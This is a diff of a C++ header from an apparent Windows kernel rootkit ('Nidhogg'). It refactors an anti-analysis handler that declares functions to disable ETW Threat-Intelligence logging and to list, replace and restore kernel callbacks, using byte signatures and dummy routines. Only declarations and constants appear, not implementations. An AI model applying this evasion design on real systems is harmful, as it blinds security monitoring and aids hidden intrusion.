@@ -5,7 +5,9 @@ extern "C" {
 	#include "WindowsTypes.h"
 	#include "NidhoggCommon.h"
 }
+#include "MemoryAllocator.hpp"
 #include "MemoryHelper.h"
+#include "ListHelper.hpp"
 
 constexpr UCHAR EtwThreatIntProvRegHandleSignature1[] = { 0x60, 0x4C, 0x8B, 0xCC };
 constexpr UCHAR EtwThreatIntProvRegHandleSignature2[] = { 0xD2, 0x48, 0x8B, 0xCC };
@@ -106,8 +108,8 @@ constexpr SIZE_T CallbacksListCountOffset = 7;
 constexpr SIZE_T RoutinesListOffset = 7;
 constexpr SIZE_T PsNotifyRoutinesRoutineCountOffset = 0xB;
 constexpr SIZE_T MAX_DRIVER_PATH = 256;
-constexpr SIZE_T MAX_KERNEL_CALLBACKS = 256;
 constexpr ULONG MAX_ROUTINES = 64;
+constexpr SIZE_T ROUTINE_MASK = ~(1ULL << 3) + 1;
 
 enum CallbackType {
 	ObProcessType,
@@ -120,16 +122,24 @@ enum CallbackType {
 	CmRegistryType
 };
 
-struct KernelCallback {
+template<typename CallbackListType>
+struct IoctlCallbackList {
+	CallbackType Type;
+	SIZE_T Count;
+	CallbackListType* Callbacks;
+};
+
+struct IoctlKernelCallback {
 	CallbackType Type;
 	ULONG64 CallbackAddress;
 	bool Remove;
 };
 
 struct DisabledKernelCallback {
+	LIST_ENTRY Entry;
 	CallbackType Type;
 	ULONG64 CallbackAddress;
-	ULONG64 Entry;
+	ULONG64 CallbackEntry;
 };
 
 struct ObCallback {
@@ -149,42 +159,55 @@ struct CmCallback {
 	CHAR DriverName[MAX_DRIVER_PATH];
 };
 
-struct ObCallbacksList {
-	CallbackType Type;
-	ULONG NumberOfCallbacks;
-	ObCallback* Callbacks;
-};
-
-struct PsRoutinesList {
-	CallbackType Type;
-	ULONG NumberOfRoutines;
-	PsRoutine* Routines;
-};
-
-struct CmCallbacksList {
-	ULONG NumberOfCallbacks;
-	CmCallback* Callbacks;
-};
-
-OB_PREOP_CALLBACK_STATUS ObPreOpenDummyFunction(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION Info);
-VOID ObPostOpenDummyFunction(PVOID RegistrationContext, POB_POST_OPERATION_INFORMATION Info);
-void CreateProcessNotifyExDummyFunction(PEPROCESS Process, HANDLE ProcessId, PPS_CREATE_NOTIFY_INFO CreateInfo);
-void CreateProcessNotifyDummyFunction(HANDLE ParentId, HANDLE ProcessId, BOOLEAN Create);
-void CreateThreadNotifyDummyFunction(HANDLE ProcessId, HANDLE ThreadId, BOOLEAN Create);
-void LoadImageNotifyDummyFunction(PUNICODE_STRING FullImageName, HANDLE ProcessId, PIMAGE_INFO ImageInfo); 
-NTSTATUS RegistryCallbackDummyFunction(PVOID CallbackContext, PVOID Argument1, PVOID Argument2);
-
-class AntiAnalysis {
-private:
-	DisabledKernelCallback DisabledCallbacks[MAX_KERNEL_CALLBACKS];
-	ULONG DisabledCallbacksCount;
-	ULONG DisabledCallbacksLastIndex;
-	ULONG PrevEtwTiValue;
+struct CallbackList {
+	SIZE_T Count;
 	FastMutex Lock;
+	PLIST_ENTRY Items;
+	PUCHAR sigCallbackList;
+	ULONG_PTR sigCallbackListLock;
+	PULONG sigCallbackListCount;
+};
 
-	NTSTATUS MatchCallback(PVOID callack, CHAR driverName[MAX_DRIVER_PATH]);
-	NTSTATUS AddDisabledCallback(DisabledKernelCallback Callback);
-	NTSTATUS RemoveDisabledCallback(KernelCallback* Callback, DisabledKernelCallback* DisabledCallback);
+OB_PREOP_CALLBACK_STATUS ObPreOpenDummyFunction(_In_ PVOID registrationContext, _Inout_ POB_PRE_OPERATION_INFORMATION info);
+void ObPostOpenDummyFunction(_In_ PVOID registrationContext, _In_ POB_POST_OPERATION_INFORMATION info);
+void CreateProcessNotifyExDummyFunction(_Inout_ PEPROCESS process, _In_ HANDLE processId, _Inout_opt_ PPS_CREATE_NOTIFY_INFO createInfo);
+void CreateProcessNotifyDummyFunction(_In_ HANDLE parentId, _In_ HANDLE processId, _In_ BOOLEAN create);
+void CreateThreadNotifyDummyFunction(_In_ HANDLE processId, _In_ HANDLE threadId, _In_ BOOLEAN create);
+void LoadImageNotifyDummyFunction(_In_opt_ PUNICODE_STRING fullImageName, _In_ HANDLE processId, _In_ PIMAGE_INFO imageInfo);
+
+_IRQL_requires_same_
+_Function_class_(EX_CALLBACK_FUNCTION)
+NTSTATUS RegistryCallbackDummyFunction(_In_ PVOID callbackContext, _In_opt_ PVOID argument1, _In_opt_ PVOID argument2);
+
+class AntiAnalysisHandler {
+private:
+	CallbackList psRoutines;
+	CallbackList obCallbacks;
+	CallbackList cmCallbacks;
+	ULONG prevEtwTiValue;
+
+	_IRQL_requires_max_(APC_LEVEL)
+	char* MatchCallback(_In_ PVOID callack);
+
+	_IRQL_requires_max_(APC_LEVEL)
+	bool AddCallback(_In_ DisabledKernelCallback& callback);
+
+	_IRQL_requires_max_(APC_LEVEL)
+	bool RemoveCallback(_In_ DisabledKernelCallback* callback);
+
+	_IRQL_requires_max_(APC_LEVEL)
+	DisabledKernelCallback* FindCallback(_In_ IoctlKernelCallback& callback) const;
+
+	_IRQL_requires_max_(APC_LEVEL)
+	DisabledKernelCallback* FindCallback(_In_ DisabledKernelCallback& callback) const;
+
+	_IRQL_requires_max_(APC_LEVEL)
+	NTSTATUS ListAndReplacePsNotifyRoutines(_Inout_opt_ IoctlCallbackList<PsRoutine>* callbacks = nullptr, 
+		_In_opt_ ULONG64 replacerFunction = 0, _In_opt_ ULONG64 replacedFunction = 0);
+
+	_IRQL_requires_max_(APC_LEVEL)
+	NTSTATUS ListAndReplaceRegistryCallbacks(_Inout_opt_ IoctlCallbackList<CmCallback>* callbacks = nullptr,
+		_In_opt_ ULONG64 replacerFunction = 0, _In_opt_ ULONG64 replacedFunction = 0);
 
 public:
 	void* operator new(size_t size) {
@@ -196,15 +219,32 @@ public:
 			ExFreePoolWithTag(p, DRIVER_TAG);
 	}
 
-	AntiAnalysis();
-	~AntiAnalysis();
+	_IRQL_requires_max_(APC_LEVEL)
+	AntiAnalysisHandler();
 
-	NTSTATUS EnableDisableEtwTI(bool enable);
-	NTSTATUS RestoreCallback(KernelCallback* Callback);
-	NTSTATUS RemoveCallback(KernelCallback* Callback);
-	NTSTATUS ListObCallbacks(ObCallbacksList* Callbacks);
-	NTSTATUS ListPsNotifyRoutines(PsRoutinesList* Callbacks, ULONG64 ReplacerFunction, ULONG64 ReplacedFunction);
-	NTSTATUS ListRegistryCallbacks(CmCallbacksList* Callbacks, ULONG64 ReplacerFunction, ULONG64 ReplacedFunction);
+	_IRQL_requires_max_(APC_LEVEL)
+	~AntiAnalysisHandler();
+
+	_IRQL_requires_max_(APC_LEVEL)
+	NTSTATUS EnableDisableEtwTI(_In_ bool enable);
+
+	_IRQL_requires_max_(APC_LEVEL)
+	NTSTATUS RestoreCallback(_In_ IoctlKernelCallback& callback);
+
+	_IRQL_requires_max_(APC_LEVEL)
+	NTSTATUS RestoreCallback(_Inout_ DisabledKernelCallback* callback);
+
+	_IRQL_requires_max_(APC_LEVEL)
+	NTSTATUS ReplaceCallback(_In_ IoctlKernelCallback& callback);
+
+	_IRQL_requires_max_(APC_LEVEL)
+	NTSTATUS ListObCallbacks(_Inout_ IoctlCallbackList<ObCallback>* callbacks);
+
+	_IRQL_requires_max_(APC_LEVEL)
+	NTSTATUS ListPsNotifyRoutines(_Inout_ IoctlCallbackList<PsRoutine>* callbacks);
+
+	_IRQL_requires_max_(APC_LEVEL)
+	NTSTATUS ListRegistryCallbacks(_Inout_ IoctlCallbackList<CmCallback>* callbacks);
 };
 
-inline AntiAnalysis* NidhoggAntiAnalysis;
+inline AntiAnalysisHandler* NidhoggAntiAnalysisHandler;
